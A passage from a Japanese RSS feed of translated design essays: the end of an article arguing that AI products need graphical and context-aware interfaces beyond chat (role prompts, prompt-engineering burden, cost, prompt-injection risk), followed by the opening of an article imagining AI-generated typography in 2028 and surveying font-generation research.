<p>パラメーターで表現される知識の地図にピンを置くことは、些細なことではありません。LLMは極めて不透明であり、<a href="https://openaipublic.blob.core.windows.net/neuron-explainer/paper/index.html">OpenAI社でさえ「仕組みを理解していない」と認めています</a>。しかし、モデルを大まかに導き、異なる知識領域から回答を作成するような方法で入力をカスタマイズすることが可能です。</p>
<p>注意を向ける手法としてよく使われるのが、<strong>ロールプレイング</strong>です。「自分は歴史家であると想像してください」と入力するなどして、LLMに特定の役割（ロール）を演じさせることで、効果的にモードを切り替えることができます。<a href="https://promptengineering.org/role-playing-in-large-language-models-like-chatgpt/">プロンプト・エンジニアリング・インスティテュートは次のように説明しています</a>。「多彩なドメインから集めたテキストデータの大規模なコーパスを用いて訓練する際、モデルはさまざまなロールとそれらに関連付けられた言語について複雑な理解を形成します。」ロールを演じることで、AIの訓練データの関連する要素（トーン、スキル、合理性など）が呼び出されるのです。</p>
<p>例えば、歴史家のロールは事実に基づく詳細によって回答するのに対し、語り手のロールは叙述的説明によって回答します。また、データサイエンティストのロールを割り当ててPythonコードによる回答を生成するなどして、作業の効率化を図ることもできます。</p>
<p><a href="https://www.youtube.com/watch?v=ieWT6X2Yh_g">ジェイソン・ユアン氏</a>が「バンキングAIエージェントはおそらくあなたと深い哲学的な会話をできるべきではないでしょう」と述べるように、ロールは社会規範を強化するものでもあります。しかし、対話型インターフェースはこの手のシステムステータスをメッセージ履歴に埋没させてしまうため、我々は<a href="https://www.nngroup.com/articles/working-memory-external-memory/">作業記憶</a>に留めておく必要があります。</p>
<p><img src="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/9-abstraction-rolebot.gif"></p>
<p><em>セグメント化されたコントローラーを使用してユーザーがワンクリックでロールを特定できる理論上のAIチャットボット—各ボタンが自動的にLLMのシステムプロンプトを調節する。（出典：<a href="https://www.maximillian.nyc/">マクシミリアン・ピラス</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/9-abstraction-rolebot.gif">拡大プレビュー</a>）</em></p>
<p>ロールプレイのようなコンテキストに対する永続的なシグニファイアが欠けていると、ユーザビリティの問題につながる場合があります。明確化のため、ターミナルに<code class="language-text">ls</code>や<code class="language-text">cd</code>コマンドを打ち込むのと同じように、頻繁にAIのステータスを尋ねる必要があります。専門家であれば問題ないでしょうが、素人の頭には負担が大きいでしょう。問題は人間の記憶力にとどまらず、システムにも同様の認知的過負荷がかかります。コンテキストウィンドウに表示できるデータ量が限られているため、ユーザーは最終的にシステムより下位のレベルでロールプレイを再び開始する必要があります。こうした情報がインターフェース上に永続的に表示されたら、ユーザーにとって明確になり、プロンプトごとにAIに対して自動的に繰り返し思い出させることができます。</p>
<p><a href="http://character.ai/">Character.ai</a>は、歴史上の人物をなじみのある焦点として用いることで、これを実現しています。文化的な共通認識により、「アル・パチーノ」に対して行う質問は、「ソクラテス」に対して行う質問とは違ったものになるでしょう。「キャラクター」が、ユーザーの期待を設定し、システム設定を自動的に調整するための原則となるのです。これは、レストランのメニューを掲示するのと似ています。客はどんな料理があるのか聞く必要がなくなり、直ちに注文することができます。</p>
<blockquote>
<p>「人間の短期記憶には限界があります。認識を促すインターフェースは、ユーザーに求められる認知的労力を減らします。」<br>
— ヤコブ・ニールセン氏、「<a href="https://www.nngroup.com/articles/ten-usability-heuristics/">10 Usability Heuristics for User Interface Design</a>（ユーザーインターフェースデザインのためのユーザビリティ10原則）」</p>
</blockquote>
<p>ユーザビリティに関する教訓でもう一つ忘れられているのが、タスクの中には説明するより行う方が簡単なものがあるということです。これは、GUIで普及しているような<a href="https://www.nngroup.com/articles/direct-manipulation/">直接操作</a>するスタイルのインタラクションを通して行う場合に特に当てはまります。</p>
<p>Photoshopの新しい生成AI機能は、グラフィカルインターフェースと統合することでこの概念を強化しています。<a href="https://www.adobe.com/products/photoshop/generative-fill.html">生成塗りつぶし</a>には入力欄がありますが、定番のなげなわツールのようなスキュアモーフィックコントロールも使用します。画像のどの部分を操作するのか説明するのは、クリックするよりもはるかに面倒です。</p>
<p><strong>言葉が非効率な場合、インタラクションは入力欄以外の方法で行うべきです</strong>。サイズを変更したいとき、「大きくして」と言葉で言うと主観が入り込む余地があまりに大きすぎるため、スライダーを使用する方が良いでしょう。色やアスペクト比は、説明するより選択した方が簡単です。また、標準化されたコントロールの方が、システムが裏でプロンプトを整理しやすいでしょう。例えば、モデルがパラメーターに対する特定の値を受け取った場合、インターフェースが自然なマッピングで入力方法を示すことができます。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/10-abstraction-promptgui.png"></p>
<p><em>Visual Electricの入力欄。システムが裏でプロンプトを整理するのにグラフィカルコントロールがどう役立つかが分かります。（画像出典：<a href="https://www.maximillian.nyc/">マクシミリアン・ピラス</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/10-abstraction-promptgui.png">拡大プレビュー</a>）</em></p>
<p>これらのユーザビリティ原則のほとんどは30年以上前のものであるため、今でも重要なのか疑問に思う人もいるでしょう。<a href="https://www.nngroup.com/articles/ten-usability-heuristics/">ヤコブ・ニールセン氏が最近、この点について次のように考えを述べています</a>。「26年間有効であったなら、未来の世代のユーザーインターフェースにも当てはまるでしょう。」しかし、必ずしも古典的な構成要素を使用しなくても、これらのユーザビリティ原則に従うことはできます。Kreaのようなアプリは、生成AIを操作する<a href="https://twitter.com/MaximillianNYC/status/1733627162517794899/video/1">新しいGUI</a>をすでに模索しています。</p>
<h2>プロンプトエンジニアリングは専門的な技術である <a href="#プロンプトエンジニアリングは専門的な技術である">#</a><a name="プロンプトエンジニアリングは専門的な技術である"></a></h2>
<p>現在の対話型インターフェースのユーザビリティに関する最大の問題は、一般ユーザーに技術的な作業を押し付けることです。
コマンドラインとの共通点で言うと、見つけにくさの他に、<strong>コマンドを学ばなければ望ましい出力が得られない</strong>ことが挙げられます。生成AIシステムと効果的にコミュニケーションを取るために入力をカスタマイズすることを「プロンプトエンジニアリング」と呼びます。その名前からも分かるように、プロンプトエンジニアリングは専門家が行うものです。その技術を磨けば<a href="https://www.wsj.com/tech/ai/talking-to-chatbots-is-now-a-200k-job-so-i-applied-258bd5f0">年収20万ドル</a>の仕事を獲得することも可能です。</p>
<p>自然言語によるプログラミングは素晴らしい進歩ですが、消費者向けアプリケーションの要件とするのは間違っているように感じます。誰もがコンピューターと同じ言語を話せるからと言って、何を言えばいいか、どう言うのが一番いいかを知っているとは限りません。一般のユーザーは専門家による手引きが必要です。新しいテクノロジー使いこなすためには学習が不可欠ですが、対話型インターフェースに関しては習得が難しく、それがさらなる普及と長期的な定着の妨げになりそうです。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/11-abstraction-magicstudio.jpeg"></p>
<p><em>Canva社のAI機能「マジックスタジオ」。（画像出典：<a href="https://www.businesswire.com/news/home/20231004078842/en/Canva-Celebrates-10th-Anniversary-With-Launch-of-World%E2%80%99s-First-All-In-One-AI-Design-Offering-for-Everyone-and-Every-Business">ビジネスワイヤ</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/11-abstraction-magicstudio.jpeg">拡大プレビュー</a>）</em></p>
<p>質の高い出力を得るために必要なプロンプトエンジニアリングは、黒魔術のような神秘的雰囲気をまとっているように感じます。AI機能を紹介する販促資料の多くが「魔法」といった表現を使用していることも、そうした印象を強めています。正のフィードバックループが働いていると仮定すると、この不透明さが消費者の好奇心をそそるのでしょう。</p>
<p>しかし、呪文書やシャーマンの領域に製品を位置付けるのは、理解不能な体験であることを示唆することにもなります。これは長期的に良い戦略なのでしょうか。スティーブ・クリュッグ氏が『<a href="https://sensible.com/dont-make-me-think/">Don’t Make Me Think</a>』（2000年）で紹介し、大きな影響を及ぼした教訓がまだ当てはまると仮定した場合、ほとんどの人は適切なプロンプトをわざわざ学習しようとは思わず、どうにか乗り切ろうとするでしょう。</p>
<p>試行錯誤しながら生成AIを使うことの問題は、毎回何かしら回答が得られるため「失敗」がないことです。例えば、LLMに数学の問題を解いてもらった場合、自信満々に出した答えが<a href="https://garymarcus.substack.com/p/math-is-hard-if-you-are-an-llm-and">完全な間違い</a>であることもあります。回答が全くの誤り（ハルシネーション）であっても、それが分からなければ失敗から学ぶのは難しくなります。OpenAI社の<a href="https://twitter.com/karpathy/status/1733299213503787018">アンドレイ・カルパシー氏が言うように</a>、LLMは「夢のマシン」であるため、ハルシネーションは必ずしもバグとは言えません。したがって、<strong>すべてはインターフェースがユーザーに何を期待させるのかによる</strong>のです。</p>
<blockquote>
<p>「相手が人である場合と同じように、AIから最も意味のある答えを引き出すには、最適な質問をする必要があります。AIは超能力者でもテレパシーが使えるわけでもありません」<br>
— ステファン・J・ビゲロウ氏、「<a href="https://www.techtarget.com/whatis/feature/Skills-needed-to-become-a-prompt-engineer">5 Skills Needed to Become a Prompt Engineer</a>（プロンプトエンジニアになるために必要な5つのスキル）」</p>
</blockquote>
<p>魔法を思わせるような表現を使用すると、素人はAIが全知的存在であると考えてしまうかもしれません。AIの知識が訓練データに限られていることは、必ずしも明白ではありません。</p>
<ul>
<li>
<p>データセットの限界に達した場合、ユーザーはRAG（<a href="https://blogs.nvidia.com/blog/what-is-retrieval-augmented-generation/">Retrieval-Augmented Generation</a>：検索拡張生成）によって補完できることを知っているか？</p>
</li>
<li>
<p>ユーザーは、AIの推論を調整するため、<a href="https://www.promptingguide.ai/techniques/fewshot">フューショット</a>や<a href="https://www.promptingguide.ai/techniques/cot">思考の連鎖</a>といった別のプロンプトテクニックが使えることを知っているか？</p>
</li>
</ul>
<p>魔法の粉の効果が失われると、ソフトウェアデザイナーは<strong>こうした判断が</strong>ユーザー体験につながることに気付くでしょう。</p>
<p>ユーザーが喜ぶものを作るには、適切なプロンプトテクニック、ナレッジソース、モデルを選択する必要があります。この作業をいかにユーザーに押し付けないようにするかを考えるべきです。</p>
<ul>
<li>AIの知識の限界を何も表示しないことによって示せば、ユーザーは必要に応じて不足を補うことができます。</li>
<li>導入フローの中でユーザーの目的を確認すれば、最適な推論が可能な適切なモデルを提案できます。</li>
<li>あいまい検索と同様の機能により、ユーザーの入力にマーキングすることで、有効な調整の仕方を教えることができます。</li>
</ul>
<p>ユーザーの入力を裏で<a href="https://community.openai.com/t/api-image-generation-in-dall-e-3-changes-my-original-prompt-without-my-permission/476355">リライトする</a>ことで、出力結果を最適化できるOpenAI社の画像生成AIが一つのヒントを提示しています。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/12-abstraction-promptengineering.png"></p>
<p><em>グラフィカルユーザーインターフェースと自由形式の入力を組み合わせることで、RAGのようなテクニックを使用してプロンプトエンジニアリングを自動化できることを示す例。（画像出典：<a href="https://www.maximillian.nyc/">マクシミリアン・ピラス</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/12-abstraction-promptengineering.png">拡大プレビュー</a>）</em></p>
<h2>ランボルギーニでピザ宅配 <a href="#ランボルギーニでピザ宅配">#</a><a name="ランボルギーニでピザ宅配"></a></h2>
<p>ユーザビリティの問題がもたらす認知コストの他に、<strong>経済的コスト</strong>についても考慮する必要があります。対話型インターフェースとのインタラクションは、すべてAIが推論して回答を出す必要があります。これには、GUIのボタンをクリックするよりはるかに高い処理能力が求められます。現在のコンピューティングコストだと、かなり法外な費用がかかります。高い知能がもたらす価値が値段に見合わないタスクも中にはあります。</p>
<p>例えば、<a href="https://www.wsj.com/tech/ai/ais-costly-buildup-could-make-early-products-a-hard-sell-bdd29b9f">ウォール・ストリート・ジャーナル紙</a>はメールの要約などのタスクにLLMを使用するのは、「ランボルギーニでピザを宅配してもらうようなものだ」と論じています。コストがかさむ要因の一つは、AIシステムが一般的なソフトウェアのようにスケールメリットを生かせていないことにあります。あらゆるインタラクションに膨大な計算が求められるため、使えば使うほどコストは直線的に増え続けます。限界費用ゼロの複製が使えないため、一般的なソフトウェアのサブスクリプションモデルは現実的ではありません。</p>
<p>消費者は高い値段を払って対話型インターフェースを買うでしょうか。それとも、AI機能を搭載した、コスパの良いGUIを選ぶでしょうか。皮肉にも、この苦境は初期のGUIが直面した困難を思い出させます。基礎となるビットマップの処理に必要なCPUのロジックとメモリの処理速度が現実的に使えるようになったのは、何年も後になってメモリチップの価格が下がってからです。歴史は繰り返すことを願いましょう。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_2000/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/13-abstraction-ramchips.jpeg"></p>
<p><em>ゼロックス社製「Alto」の初期のラスターディスプレイを描いたスケッチ。メモリチップの価格が下がるまでは膨大なコストがかかっていました。（画像出典：<a href="http://worrydream.com/EarlyHistoryOfSmalltalk/">ブレット・ビクター</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/13-abstraction-ramchips.jpeg">拡大プレビュー</a>）</em></p>
<p><strong>セキュリティリスク</strong>も考慮すべきコストの一つです。ピザの宅配中にランボルギーニが盗難されたとしたら？AIに何でも自由に質問できるようにすれば、質問を通じて意図的に操ろうとする人も出てきます。自然言語によりシステムを操ろうとすることを<a href="https://developer.nvidia.com/blog/securing-llm-systems-against-prompt-injection/">プロンプトインジェクション</a>と言います。言葉の順番を工夫すれば、入力欄が攻撃ベクトルになり、悪意のあるユーザーが個人の<a href="https://stackdiary.com/chatgpts-training-data-can-be-exposed-via-a-divergence-attack/">情報やシステム</a>にアクセスできてしまう可能性もあります。</p>
<p>したがって、AIを<a href="https://www.lindy.ai/blog/announcing-a-new-way-to-create-ai-employees">チームの一員</a>と位置付ける場合は注意が必要です。なぜなら、従業員はすでにサイバーセキュリティ対策における最も大きな脆弱性の一つと見なされているからです。間違ったビジネスロジックを使うことで、会社に被害をもたらすフィッシングメールの数を誤って最大化してしまう可能性もあります。</p>
<p>優れたデザインにより、AIがユーザーにとって最も有意義であるポイントを特定することで、こうしたコストを低減することができます。そのような場面では人間のような会話ベースのインタラクションを重視し、他ではよりコスパに優れた要素を使用すると良いでしょう。プロンプトインジェクション対策としては、セキュアなシステムしかアクセスできない場所に機密性の高いデータを置くことです。LLMがあまり計算を得意としないことは分かっているので、請求書の処理のような退屈な仕事をさせるのではなく、創造的コラボレーションに注力させると良いでしょう。</p>
<h2>生成は予測である <a href="#生成は予測である">#</a><a name="生成は予測である"></a></h2>
<p><a href="https://www.smashingmagazine.com/2023/08/friction-feature-machine-learning-algorithms/">筆者が以前Smashingに投稿した記事</a>で、アルゴリズムに適したインターフェースの概念について説明しました。これらのインターフェースは、あらゆるインタラクションを、双方向のフィードバックを通じて理解を深める機会と捉えます。ユーザーにシステムフィードバックを提供しつつ、システムにはパフォーマンスフィードバックを返します。予測精度を最適化するデータ収集ポイントを最大化することがその成功を左右します。出力の予測精度を高めると、ユーザーの定着率が上がる傾向にあります。したがって、優れたデータはネットワーク効果を通じて強化され、価値が一層高まります。</p>
<p>筆者は以前コンテンツレコメンデーションアルゴリズムを専門としていましたが、これを生成AIに適用することは可能でしょうか。出力は全く異なりますが、どちらも予測モデルです。個人ユーザーの特徴、好み、行動といった具体的なデータを使用することで、これらの予測をカスタマイズすることが可能です。</p>
<p>Spotifyがユーザーの音楽の好みを学習し、新曲をレコメンドするのと同様に、理論上では生成AIをパーソナライズすることは可能でしょう。使用履歴や好みをもとにMidjourneyが画像生成パラメーターをレコメンドすることもできるはずです。ChatGPTは、状況に応じて適切なロールを演じることができるでしょう（システムステータスも可視化できるとなお良いですが）。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/14-abstraction-signals.jpeg"></p>
<p><em>アルゴリズムに適したインターフェースのフィードバックループ。（画像出展：<a href="https://www.maximillian.nyc/">マクシミリアン・ピラス</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/14-abstraction-signals.jpeg">拡大プレビュー</a>）</em></p>
<p>この領域はまだ若干未知のところもあるため、対話型インターフェースがどの程度アルゴリズムに適しているのかは不明です。対話型インターフェースの使い勝手に影響を及ぼしている同じ発見可能性の問題が、エンゲージメントシグナルを分析する能力にも影響を及ぼす可能性があります。ノイズとシグナルを区別できなければ、パーソナライゼーションの実現性は低くなるでしょう。「いいね」ボタンをタップするという簡単なインタラクションを検討してみましょう。バックエンド側には非常にクリーンなシグナルが送られます。</p>
<p>対話においてこれと同等のインタラクションは何でしょうか。「いいね」という言葉を入力するのは、この言葉が普段の会話の中で何気なく使われるものであるため、シグナルとしては確実性に劣るかもしれません。筆者が以前の記事で紹介した知見によると、効果的なパーソナライゼーションは極めて価値が高く、不具合があった場合は会社の収益に大きな影響を及ぼすことが示唆されます。</p>
<p>別のLLMを推論エンジンとして使用し、非構造化入力の体裁を自動的に整えて、明瞭なエンゲージメントシグナルに変換することが解決策になるかもしれません。しかし、<strong>データ収集の効率性が明確になるまでは、対話型インターフェースのメリットがパーソナライゼーションの後退によるリスクを上回るのか、デザイナーは問うべきでしょう</strong>。</p>
<h2>次の抽象化レイヤーに向けて <a href="#次の抽象化レイヤーに向けて">#</a><a name="次の抽象化レイヤーに向けて"></a></h2>
<p>コンピューティングにおけるこの新たなパラダイムシフトが進む中で、この記事がインターフェースの次なる抽象化につい考える上で参考になることを願っています。対話側インターフェースは次のAIファーストデザイン時代の主流になることは間違いないでしょう。音声機能が追加されることで、私たちはパソコンの前に座り、健康を害するほど長時間作業しなくても、コンピューターが能力を引き出してくれるようになります。しかし、対話だけでは不十分であり、言葉では説明できないニーズに対応したデザインも求められます。</p>
<p>したがって、インターフェースが万能薬にならないのであれば、単純な進化のストーリーを語るのはやめ、優れたエクスペリエンスの原則を目指しましょう。我々が求めているのは、<strong>統合された、コンテキストベースで、マルチモーダルなインターフェース</strong>です。このインターフェースは、私たちがジャスチャーや図でしか意図を伝えられないこともあることを知っています。私たちが忙しすぎて会話できず、簡単な質問だけしたくても、理解してくれます。実際に会話をするときになると、このインターフェースは私たちの視点で考えることができるため、長い説明を書く煩わしさもありません。言葉でうまく説明できなくても、趣旨は伝わります。</p>
<h2>未来に対し視野を狭めない <a href="#未来に対し視野を狭めない">#</a><a name="未来に対し視野を狭めない"></a></h2>
<p>モバイルファーストデザインの時代にさかのぼる教訓が思い出されます。iPhoneが登場した数年後、タッチスクリーンが共通の未来像として人気のテーマになりました。しかし、ヒューマンインターフェースインベンター（<a href="http://worrydream.com/#!/Apple">アップル社での肩書き</a>）として尊敬を集めるブレット・ビクター氏には、タッチスクリーンは未来に対する<em>視野を狭める</em>ものと映ったようです。</p>
<p><a href="http://worrydream.com/ABriefRantOnTheFutureOfInteractionDesign/">同氏がさまざまな可能性についてざっくばらんに語った記事</a>の中で、タッチスクリーンが皮肉にも触覚を完全に無視していると指摘されています。手を通じたハプティックフィードバックにはさまざまな可能性があるものの、ほとんどのインタラクションは主に視覚に頼っています。AIファーストデザインが私たちの能力を余すことなく増強するにはどうすればよいでしょうか。</p>
<blockquote>
<p>「ツールは人間の能力を増強することによって、人のニーズを解決します。」<br>
— ブレット・ビクター氏、「<a href="http://worrydream.com/ABriefRantOnTheFutureOfInteractionDesign/">A Brief Rant on the Future of Interaction Design</a>（インタラクションデザインの未来を語る）」</p>
</blockquote>
<p>対話型インターフェースを使うべきタイミングについて、法則のようなものはあるのでしょうか。説明可能性（D）は、グラフィカルな利便性（G）と逆相関の関係にあるため、説明の複雑さが増すほど、対話型インターフェースの利便性は低くなるという観察可能な法則を、「D∝1/G」という数式で表すことは可能かもしれません。これは事実かもしれませんが、あまり役には立ちません。</p>
<p>正直なところ、現時点ではあまりに不確実なことが多いため、新しいデザイン原則について予測を立てるのは避けたいと思います。その代わり、最近亡くなったチャーリー・マンガー氏の言葉からヒントを得て、問題を反転させて考えてみることはできるかもしれません。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/16-abstraction-inversion.jpg"></p>
<p><em>私たちは基本的に優れた成果を目指し、前向きにデザインを進めますが、愚かな結果を避けるため、問題を反転させて後ろ向きにデザインしなくてはならないこともあります。（画像出展：<a href="https://www.maximillian.nyc/">マクシミリアン・ミラス</a>）（<a href="https://files.smashing.media/articles/designing-ai-beyond-conversational-interfaces/16-abstraction-inversion.jpg">拡大プレビュー</a>）</em></p>
<h2>後ろ向きにデザインする <a href="#後ろ向きにデザインする">#</a><a name="後ろ向きにデザインする"></a></h2>
<p>前を向いて次の抽象化レイヤーをデザインしようとすると、チャットボットのようなものに行き着くようです。これだけでは解決策として不完全である理由は、今では分かっています。<strong>では、問題を逆向きに捉えて、避けるべき望ましくない結果を特定してみたらどうでしょうか</strong>。優れた成果を目指すよりも、愚かな結果を避ける方が簡単でしょう。</p>
<p>避けるべき明らかな間違いは、時間の制約を考慮せず、ユーザーに対話を強要することです。対話がふさわしいときには、ユーザビリティに関する既存の問題が、同じくらいストレスのたまる新しい問題に置き換わることがないような方法で行えるようにすべきです。ピザの宅配と同等の簡単なタスクには、ランボルギーニを運転するのに匹敵するほど大掛かりなものではない、実用的な解決策を見つけるべきです。さらに、一般ユーザーに対して、プロンプトエンジニアリングの習熟を要求するのも避けるべきです。最後に、システムがより人間らしくなるにつれて、だまされやすいところも似ることがないようにしなくてはいけません。そうなった場合、我々の努力が仇となり、個人データにはるかに簡単にアクセスできるようになってしまいかねません。</p>
<p>より<strong>インテリジェント</strong>なインターフェースであれば、そのような愚かな間違いをおかすこともないでしょう。</p>
<p>本記事の草稿時に貴重なご意見をいただいた<a href="https://www.michael-sands.com/">マイケル・サンズ</a>氏、<a href="https://www.evanmiller.org/">エヴァン・ミラー</a>氏、<a href="https://www.youtube.com/@TheRiceRocketeer">コリン・カウリー</a>氏に、この場を借りて感謝の意を表します。</p>]]></content:encoded></item><item><title><![CDATA[グラフィックデザインにおけるAIジレンマ：卓越したタイポグラフィとその先へ]]></title><description><![CDATA[クイックサマリー：AIはタイポグラフィに大変革をもたらしつつあります。それは、デザイナーにとってチャンスをもたらすと同時に、課題も突きつけています。品質に影響はあるのでしょうか。また、デザインの役割…]]></description><link>https://postd.cc/ai-dilemma-graphic-design-typography/</link><guid isPermaLink="false">https://postd.cc/ai-dilemma-graphic-design-typography/</guid><category><![CDATA[AI]]></category><category><![CDATA[タイポグラフィ]]></category><pubDate>Fri, 31 May 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><strong>クイックサマリー</strong>：AIはタイポグラフィに大変革をもたらしつつあります。それは、デザイナーにとってチャンスをもたらすと同時に、課題も突きつけています。品質に影響はあるのでしょうか。また、デザインの役割や活字の使用は今後どう変わっていくのでしょうか。この未知の領域を進みながら、私たちはグーテンベルクによる印刷機の発明以来の重要な岐路に立っていることに気づかされます。近い将来、テキストとの関わり方やビジュアルコミュニケーションは大きく変わるでしょう。</p>
<hr>
<p>時は2028年、あなたは今よりもはるかにグレードアップしたワークステーションの前に座り、壁に映し出された画面を見つめています。「ねえ、AI」とあなたは語りかけます。「このページの見出しなんだけど、いくつか字体の選択肢を…」あなたが話し終わる前に、「タイプマスター3000」の愛称で呼ばれるAIアシスタントが熱心に口を挟みます。「大胆かつ奇抜なデザインがいいですか？それとも、洗練された雰囲気の中に遊び心も感じさせるセリフにしますか？」</p>
<p>あなたはあきれた顔でこう言います。「選択肢を10個出してちょうだい。今回は遊びの要素は抜きで。」</p>
<p>AIが見栄えのいいフォントや統一感のある質の高いデザインを生み出せなかった時代は終わりました。ライセンスの問題も過去の話です。2028年のAIは、独創的なフォントファミリーを複数の言語で提示できるようになっています。グリフ（訳注：一般的には「字体」などの意）も一つひとつ完璧な仕上がりです。しかし、完璧とは言え、癖がないわけではありません。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/ai-dilemma-graphic-design-typography/1-typemaster3000-jamieclarketype.jpg">
<a href="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/ai-dilemma-graphic-design-typography/1-typemaster3000-jamieclarketype.jpg"><em>拡大プレビュー</em></a></p>
<p>タイプマスター3000が瞬時に生成したフォントのサンプルを見てみると、「Sandy Serif」や「Desert Island Display」といった具合に、どのデザインにもどこか海辺のバカンスを思わせるような雰囲気があります。</p>
<p>あなたはため息をつきます。「ビーチ感は抑えて、もっとビジネスライクにしてくれる？」</p>
<p>「了解です」とタイプマスター3000は言います。「ビジネスモードに戻ります！」</p>
<p>気に入ったフォントが見つかったのでタップすると、あなたが作成したデザインに即座に反映されます。バランスや位置関係も調整されて、まるで初めからそこにあるべきであったかのような自然な仕上がりです。</p>
<h2>タイポグラフィにおけるテクノロジーの進化</h2>
<p>では、現在に視点を戻しましょう。最新のソフトウェアを駆使しても、プロフェッショナルな書体を新たに生み出す作業は時間がかかり、細心の注意が求められます。木活字に始まり、金属、フィルム、デジタルへと進化を遂げてきた活字産業は、歴史を通して常にテクノロジー革新の最前線を走ってきました。</p>
<p>新たなテクノロジーが生まれる度に、活字の生産方法は大きく変わり、活字の作成と使用の両方でデザイナーの活躍の機会が広がってきました。他の業界と同様に、我々もAIという山を麓から見上げ、この先待ち受ける険しい変化の道のりに身構えています。</p>
<p>人工知能が活字デザインに及ぼす中期的影響に関する予想は、主には大抵次の2つのシナリオに集約されます。</p>
<ol>
<li><strong>コラボレーションツールとしてのAI（副操縦士としてのAI）</strong><br>
このシナリオでは、AIは活字のデザインプロセスを支援し、太字やイタリック体の書体の作成など、時間のかかる作業を行います。活字デザイナーは反復作業の負担から解放されるため、ワークフローを合理化し、より多くの時間をクリエイティブな作業にあてることができます。</li>
<li><strong>完全AI生成フォント（オートパイロットとしてのAI）</strong><br>
タイプマスター3000のシナリオで見たように、このシナリオでは、AIは独自にフォントを作成します。その結果、愛好家がプロンプトを使用して作成した無料の書体が大量に生まれるでしょう。最初は、プロのデザインと比べて新規性や一貫性、クラフトマンシップに欠ける可能性があり、市場はより信頼できる、専門家によって生成されたAIフォントに傾くでしょう。</li>
</ol>
<p>しかし、やがて素人が作成した「海辺のバカンスにぴったりなフォントを作って」といった簡単なプロンプトでも、人の手による成果物に匹敵するものをAIが生成できるようになるでしょう。そのため、長期的にはオートパイロットフォントが優勢になってくると思われます。活字ユーザーにとっては、いずれにしても使えるフォントの選択肢が増えるため、どちらのシナリオでも喜ばしいでしょう。しかし、このような変化は活字業界を大混乱に陥れるものになります。</p>
<h2>グーテンベルク規模の大変革</h2>
<p>しかし、AIの山の頂はまだこのシナリオのはるか先です。混乱は伴うものの、これは活字産業が将来大きな革新を遂げるために必要で、重要な変化なのです。道のりは険しいかもしれませんが、AIは画期的なフォントを生成するだけでなく、テキストによるコミュニケーションに根本的な革命を起こし、動的でインタラクティブなタイポグラフィの新時代への道を開くでしょう。</p>
<p>過去にもテクノロジー革新はありましたが、タイポグラフィそのものは600年前に発明されて以来大きく変わっておらず、テキストをより広く普及させるために写字生の創造性が大いに犠牲になってきました。次の進化では、コンテキストによって変わる動的な書体が登場するでしょう。それにより、特定のコンテキストやユーザーの要望に応じてテキストをカスタマイズし、より細かいニュアンスを正確に伝えることが可能になります。</p>
<p>このようなタイポグラフィの革命は、世界の文明に大きな恩恵をもたらすと考えられ、我々の最終目的であるべきです。</p>
<h2>AI革命における最新の進歩</h2>
<p>AI画像生成は、特にディープラーニングの領域において急速な進歩を遂げています。ピクセルベースの画像を中心に、素晴らしい成果物を生み出しています。これらの画像は、ニューラルネットワークを駆使し、<a href="https://www.youtube.com/watch?v=oGvHtpJMO3M&#x26;t=78s">デジタルのモザイク画を作成するように</a>個々のピクセルを操作して生成されます。一方で、フォントの作成に不可欠なベクターグラフィックスは進化のペースが緩慢で、2023年に発表された論文の数もわずかです。</p>
<p><a href="https://en.wikipedia.org/wiki/B%C3%A9zier_curve">ベジェ曲線</a>によって定義されるベクターグラフィックスは、そのアルゴリズムの特性により、ニューラルエンコーディングの面でより複雑な課題を突きつけています。しかし、この分野に<a href="https://alexandre01.github.io/deepsvg/">言語モデルの手法を応用</a>する動きが広がっており、より高度な応用が期待できそうです。</p>
<p>とりわけ目覚ましい進展がみられるのが、AIが学習することで<a href="https://arxiv.org/abs/2303.14585">ある画像のスタイルを別の画像に適用</a>するスタイル転換の研究です。これは、円形書体とモダンなサンセリフ体を融合し、巻きひげや、ストロークのコントラストをあしらったHelveticaを作るようなものです。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/ai-dilemma-graphic-design-typography/2-font-style-transfer.png">
<em>フォントスタイル変換</em> <a href="https://files.smashing.media/articles/ai-dilemma-graphic-design-typography/2-font-style-transfer.png"><em>拡大プレビュー</em></a></p>
<p>AIが少数の文字からフォントのスタイルを学習し、それを当てはめることで完全なフォントを生成する<a href="https://arxiv.org/abs/2305.10462">フューショットフォント生成タスク</a>と呼ばれる手法でも、大きな進展がみられています。</p>
<p><img src="https://res.cloudinary.com/indysigner/image/fetch/f_auto,q_80/w_1600/https://files.smashing.media/articles/ai-dilemma-graphic-design-typography/3-few-shot-font-generation.png">
<em>フューショットフォント生成</em>  <a href="https://files.smashing.media/articles/ai-dilemma-graphic-design-typography/3-few-shot-font-generation.png"><em>拡大プレビュー</em></a></p>
<p>このアプローチは、特に多言語フォントや、巨大な文字セットを持つ日本語や中国語のフォントをデザインする上で、商業面でもクリエイティブ面でも大きな可能性を秘めています。</p>
